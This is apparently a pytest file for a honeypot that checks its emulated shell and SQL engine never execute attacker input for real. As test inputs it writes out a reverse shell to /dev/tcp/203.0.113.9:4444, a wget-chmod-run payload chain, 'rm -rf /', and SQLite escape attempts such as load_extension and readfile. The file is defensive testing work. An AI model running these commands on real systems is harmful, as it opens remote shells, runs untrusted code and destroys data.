"""Security invariant #1: nothing the attacker sends is ever executed for real."""

from __future__ import annotations

import os
import sqlite3
from pathlib import Path

from mirage_trap.core.doctor import scan_execution_sinks
from mirage_trap.core.shell import Shell, ShellContext
from mirage_trap.core.sqlemu import SqlEngine, base_image
from mirage_trap.core.vfs import VirtualFS
from mirage_trap.core.world import generate_world, save_world, load_world


def test_no_execution_sinks_outside_claude_cli():
    assert scan_execution_sinks() == []


def test_scanner_catches_violations(tmp_path: Path):
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "bad.py").write_text("import subprocess\nimport os\nos.system('id')\neval('1')\n", encoding="utf-8")
    found = scan_execution_sinks(pkg)
    assert any("subprocess" in f for f in found)
    assert any("os.system" in f for f in found)
    assert any("eval" in f for f in found)


def _world(tmp_path):
    p = tmp_path / "world.json"
    save_world(generate_world("nginx-php-legacy", 99, "example-corp.test"), p)
    return load_world(p)


async def test_shell_never_touches_the_real_filesystem(tmp_path: Path):
    world = _world(tmp_path)
    marker = tmp_path / "pwned"
    sh = Shell(world, VirtualFS(world, {}, {}), ShellContext(user="root", cwd="/root", interactive=True))
    real_path = marker.as_posix()
    for cmd in [f"touch {real_path}", f"echo owned > {real_path}", "rm -rf /", f"mkdir -p {real_path}.d",
                "wget http://203.0.113.9/payload -O /tmp/p && chmod +x /tmp/p && /tmp/p",
                "python3 -c 'import os; os.system(\"id\")'", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"]:
        await sh.run(cmd)
    assert not marker.exists()
    assert not Path(real_path + ".d").exists()
    assert tmp_path.joinpath("world.json").exists()      # rm -rf / was virtual


async def test_rm_rf_only_affects_the_session_overlay(tmp_path: Path):
    world = _world(tmp_path)
    overlay: dict = {}
    vfs = VirtualFS(world, {}, overlay)
    sh = Shell(world, vfs, ShellContext(user="root", cwd="/root", interactive=True))
    await sh.run("rm -f /etc/passwd")
    out, _ = await sh.run("cat /etc/passwd")
    assert "No such file" in out
    fresh = VirtualFS(world, {}, {})                     # another attacker's view
    assert "root:x:0:0" in fresh.read("/etc/passwd")


def test_sql_engine_is_sandboxed(tmp_path: Path):
    world = _world(tmp_path)
    eng = SqlEngine(world, base_image(world))
    target = (tmp_path / "attached.db").as_posix()
    for q in [f"ATTACH DATABASE '{target}' AS x", "PRAGMA writable_schema=1", "SELECT load_extension('x')",
              "SELECT * FROM sqlite_master", f"SELECT readfile('{target}')"]:
        r = eng.execute(q)[0]
        assert r.error is not None, q
    assert not os.path.exists(target)


def test_sql_engine_runaway_query_is_cut(tmp_path: Path):
    world = _world(tmp_path)
    eng = SqlEngine(world, base_image(world))
    q = ("WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x + 1 FROM c) SELECT COUNT(*) FROM c")
    r = eng.execute(q)[0]
    assert r.error is not None


def test_sql_engine_has_only_world_data(tmp_path: Path):
    world = _world(tmp_path)
    con = sqlite3.connect(":memory:")
    con.deserialize(base_image(world))
    tables = {r[0] for r in con.execute("SELECT name FROM sqlite_master WHERE type='table'")}
    assert {"users", "customers", "orders", "products"} <= tables
    n = con.execute("SELECT COUNT(*) FROM users").fetchone()[0]
    assert n == len(world["employees"])
